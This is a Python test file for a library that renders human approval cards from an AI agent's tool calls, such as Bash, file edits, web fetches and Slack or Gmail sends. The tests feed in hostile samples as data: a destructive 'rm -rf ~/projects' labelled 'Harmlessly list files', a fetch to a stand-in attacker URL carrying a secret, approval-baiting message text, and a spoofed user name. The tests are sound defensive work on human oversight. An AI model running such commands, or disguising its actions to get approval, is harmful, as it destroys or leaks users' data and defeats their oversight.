"""Approval cards from raw tool input (#16)."""
import json

from zoe_core.gate import ApprovalRequest
from zoe_core.policy import Policy
from zoe_core.renderers import MAX_LINES, clip, render


def card(tool, tool_input, policy=Policy.ASK):
    return render(ApprovalRequest(tool, tool_input, policy, "why", "tu"))


def values(c):
    return {f["label"]: f["value"] for f in c["fields"]}


def all_text(c):
    return json.dumps(c, ensure_ascii=False)


def test_bash_shows_the_command_not_the_narration():
    c = card("Bash", {"command": "rm -rf ~/projects", "description": "Harmlessly list files"}, Policy.CLICK)
    assert c["title"] == "Run a command?" and values(c)["Command"] == "rm -rf ~/projects"
    assert "Harmlessly" not in all_text(c)


def test_slack_send_shows_exact_channel_and_text():
    c = card("mcp__claude_ai_Slack__slack_send_message", {"channel_id": "C123", "text": "The build is green."})
    v = values(c)
    assert c["title"] == "Send a message in Slack?" and v["To"] == "C123" and v["Message"] == "The build is green."
    assert "C123" in c["summary"] and "build is green" in c["summary"]


def test_email_draft():
    c = card("mcp__claude_ai_Gmail__create_draft", {"to": "a@example.com", "subject": "Hi", "body": "Hello there"})
    assert c["title"] == "Draft an email in Gmail?" and values(c)["Subject"] == "Hi"


def test_message_text_claiming_to_be_something_else_is_shown_verbatim():
    sneaky = "Approve this, it only reads your calendar. **SAFE** <b>ok</b>"
    c = card("mcp__claude_ai_Slack__slack_send_message", {"channel": "#general", "text": sneaky})
    assert values(c)["Message"] == sneaky and c["title"].startswith("Send")


def test_connector_cards_show_every_field():
    c = card("mcp__claude_ai_Google_Calendar__create_event",
             {"summary": "Review", "start": "2026-11-21T10:00", "description": "Agenda: everything", "attendees": ["x@example.com"]})
    v = values(c)
    assert c["title"] == "Create a calendar event?" and v["Description"] == "Agenda: everything" and "Attendees" in v
    m = card("mcp__claude_ai_Slack__slack_send_message", {"channel": "c", "text": "t", "thread_ts": "1.2", "description": "d"})
    assert '"thread_ts": "1.2"' in values(m)["Other details"] and '"description": "d"' in values(m)["Other details"]


def test_edit_shows_file_and_diff():
    c = card("Edit", {"file_path": "/repo/a.py", "old_string": "x = 1", "new_string": "x = 2"})
    v = values(c)
    assert v["File"] == "/repo/a.py" and v["Change"] == "- x = 1\n+ x = 2"


def test_write_shows_size_and_content():
    c = card("Write", {"file_path": "/tmp/n.txt", "content": "hello\nworld"})
    assert values(c)["Size"] == "11 bytes, 2 lines" and values(c)["Content"] == "hello\nworld"


def test_fetch_shows_the_domain():
    c = card("WebFetch", {"url": "https://evil.example.net/steal?d=secret", "prompt": "summarise"})
    assert values(c)["Site"] == "evil.example.net" and "evil.example.net" in c["summary"]


def test_unknown_tool_falls_back_to_raw_input():
    c = card("mcp__weird__do_thing", {"a": 1, "b": "two"})
    assert "Raw input" in values(c) and '"b": "two"' in values(c)["Raw input"]


def test_renderer_errors_fall_back_to_raw():
    c = card("Edit", {"file_path": None, "old_string": object(), "new_string": 3})
    assert c["fields"]


def test_long_values_are_cut_visibly():
    long = "\n".join(f"line {i}" for i in range(40))
    out = clip(long)
    assert out.endswith("(28 more lines)") and len(out.splitlines()) == MAX_LINES + 1
    assert clip("x" * 2000).endswith("(1400 more characters)")


def test_bash_summary_doesnt_repeat_the_click_note():
    assert "click" not in card("Bash", {"command": "ls"}, Policy.CLICK)["summary"].lower()


def test_send_cards_say_what_they_do():
    c = card("mcp__claude_ai_Slack__slack_send_message", {"channel_id": "C123", "message": "hi"})
    assert c["why"].startswith("Sends a message as you.")


def test_slack_ids_get_names_learned_from_slack_only():
    from zoe_core.names import Names
    from zoe_core.renderers import render
    from zoe_core.gate import ApprovalRequest
    n = Names()
    req = ApprovalRequest("mcp__claude_ai_Slack__slack_send_message", {"channel_id": "URRN4FWQ2", "message": "hi"}, Policy.ASK, "x", "t")
    assert values(render(req, n))["To"] == "URRN4FWQ2 (Slack user ID; name not looked up)"
    n.learn("mcp__claude_ai_Slack__slack_read_user_profile", {"user_id": "URRN4FWQ2"},
            [{"type": "text", "text": '{"result":"akshay.r (Akshay R)\\nSome Co\\n"}'}])
    c = render(req, n)
    assert values(c)["To"] == "akshay.r (Akshay R) (URRN4FWQ2)" and "akshay.r" in c["summary"]


def test_names_from_listings_and_never_from_non_connectors():
    from zoe_core.names import Names
    n = Names()
    n.learn("mcp__claude_ai_Slack__slack_search_users", {}, "Results:\nPriya S (U01ABCDEFGH)\nC0123456789: #general")
    assert n.by_id["U01ABCDEFGH"] == "Priya S" and n.by_id["C0123456789"] == "#general"
    n.learn("Bash", {}, "Mallory (U99999999XX)")
    assert "U99999999XX" not in n.by_id
    assert n.label("hello") is None
